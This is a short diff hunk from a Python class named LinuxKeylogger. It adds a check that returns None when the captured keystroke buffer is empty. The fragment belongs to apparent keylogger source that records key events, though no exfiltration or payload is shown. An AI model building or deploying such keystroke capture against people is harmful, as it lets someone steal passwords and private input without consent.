@@ -97,7 +97,8 @@ class LinuxKeylogger:
         with self._lock:
             data = self.buffer.copy()
             self.buffer.clear()
-
+        if not data:
+            return None
         return DataWrapper(data)
 
     def _on_key_event(self, key: kb.Key | kb.KeyCode):
